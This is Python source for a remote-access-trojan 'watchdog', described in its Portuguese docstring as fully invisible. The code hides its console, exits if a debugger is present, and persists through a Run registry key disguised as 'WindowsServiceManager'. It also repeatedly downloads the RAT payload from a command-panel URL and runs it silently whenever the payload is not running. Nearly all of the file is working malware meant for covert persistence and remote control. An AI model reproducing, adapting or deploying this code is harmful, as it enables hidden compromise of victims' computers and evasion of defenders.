"""
Esquizorat Watchdog v1 - Zero Detection
Monitora o RAT principal. Se morrer, baixa e re-executa.
Auto-persiste via Registry. Completamente invisivel.
"""
import os, sys, time, ctypes, random, subprocess, winreg

PANEL_URL = "PANEL_URL_PLACEHOLDER"
RAT_NAME = "progam.scr"
WATCHDOG_NAME = "watchdog.exe"
CHECK_INTERVAL_MIN = 15
CHECK_INTERVAL_MAX = 45
DOWNLOAD_RETRIES = 3

def hide_console():
    try:
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        ctypes.windll.kernel32.FreeConsole()
    except:
        pass

def anti_debug():
    try:
        if ctypes.windll.kernel32.IsDebuggerPresent():
            os._exit(0)
    except:
        pass

def get_exe_dir():
    try:
        return os.path.dirname(sys.executable)
    except:
        return os.path.join(os.environ.get('TEMP', '.'), 'winsvc')

def install_persistence():
    try:
        exe_path = sys.executable
        reg_path = r'Software\Microsoft\Windows\CurrentVersion\Run'
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, 'WindowsServiceManager', 0, winreg.REG_SZ, exe_path)
        winreg.CloseKey(key)
        return True
    except:
        return False

def is_rat_running():
    try:
        result = subprocess.check_output(
            f'tasklist /FI "IMAGENAME eq {RAT_NAME}" /NH',
            shell=True, text=True, timeout=5
        )
        return RAT_NAME.lower() in result.lower()
    except:
        return False

def download_rat():
    try:
        import requests
        url = f"{PANEL_URL}/api/download"
        for i in range(DOWNLOAD_RETRIES):
            try:
                r = requests.get(url, timeout=30)
                if r.status_code == 200:
                    path = os.path.join(get_exe_dir(), RAT_NAME)
                    with open(path, 'wb') as f:
                        f.write(r.content)
                    return path
            except:
                time.sleep(5 * (i + 1))
    except:
        pass
    return None

def execute_rat(path):
    try:
        subprocess.Popen(
            path,
            shell=True,
            creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess, 'CREATE_NO_WINDOW') else 0,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        return True
    except:
        return False

def main_loop():
    if "PLACEHOLDER" in PANEL_URL:
        return
    
    os.makedirs(get_exe_dir(), exist_ok=True)
    install_persistence()
    
    while True:
        if not is_rat_running():
            path = download_rat()
            if path:
                execute_rat(path)
        
        time.sleep(random.randint(CHECK_INTERVAL_MIN, CHECK_INTERVAL_MAX))

if __name__ == "__main__":
    hide_console()
    anti_debug()
    try:
        main_loop()
    except:
        time.sleep(10)
